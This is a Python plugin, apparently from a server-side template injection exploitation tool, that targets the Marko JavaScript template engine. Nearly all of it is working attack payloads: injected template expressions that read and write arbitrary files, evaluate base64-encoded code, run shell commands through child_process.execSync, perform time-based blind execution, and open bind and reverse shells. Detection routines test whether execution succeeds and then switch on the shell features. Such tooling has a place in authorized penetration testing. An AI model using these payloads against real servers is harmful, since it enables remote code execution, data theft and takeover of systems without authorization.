from utils.strings import quote
from core.plugin import Plugin
from core import languages
from utils.loggers import log
from utils import rand
import base64
import re

class Marko(Plugin):

    actions = {
        'render' : {
            'render': '${%(code)s}',
            'header': '${"%(header)s"}',
            'trailer': '${"%(trailer)s"}'
        },
        'write' : {
            'call' : 'inject',
            'write' : """${require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')}""",
            'truncate' : """${require('fs').writeFileSync('%(path)s', '')}"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """require('fs').readFileSync('%(path)s').toString('base64')"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """require('crypto').createHash('md5').update(require('fs').readFileSync('%(path)s')).digest("hex")"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate' : """${eval(Buffer('%(code_b64)s', 'base64').toString())}""",
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
        },
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """${require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')}"""
        },
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 }

    ]

    language = 'javascript'

    def rendered_detected(self):

        self.set('engine', self.plugin.lower())
        self.set('language', self.language)

        os = self.evaluate("""require('os').platform()""")
        if os and re.search('^[\w-]+$', os):
            self.set('os', os)
            self.set('evaluate', self.language)
            self.set('write', True)
            self.set('read', True)

            expected_rand = str(rand.randint_n(2))
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)
                self.set('bind_shell', True)
                self.set('reverse_shell', True)


    def blind_detected(self):

        self.set('engine', self.plugin.lower())
        self.set('language', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)